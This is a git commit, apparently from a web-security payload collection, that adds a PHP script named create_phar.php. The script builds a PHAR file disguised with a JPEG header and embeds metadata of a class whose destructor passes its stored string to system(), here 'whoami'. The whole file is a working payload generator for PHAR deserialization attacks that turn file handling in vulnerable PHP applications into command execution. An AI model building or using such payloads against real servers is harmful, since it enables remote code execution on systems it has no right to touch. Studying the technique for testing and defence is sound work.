dd74c595c23728974afc69d2da19bd1784e29195
Orangius <richarddufour@laposte.net>
2024-07-12 14:42:36 +0200

    Phar

---
+++ Deserialization/create_phar.php
@@ -0,0 +1,23 @@
+<?php
+
+class AnyClass {
+public $data = null;
+public function __construct($data) {
+$this->data = $data;
+}
+
+function __destruct() {
+system($this->data);
+}
+}
+
+// create new Phar
+$phar = new Phar('test.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+
+// add object of any class as meta data
+$object = new AnyClass('whoami');
+$phar->setMetadata($object);
+$phar->stopBuffering();
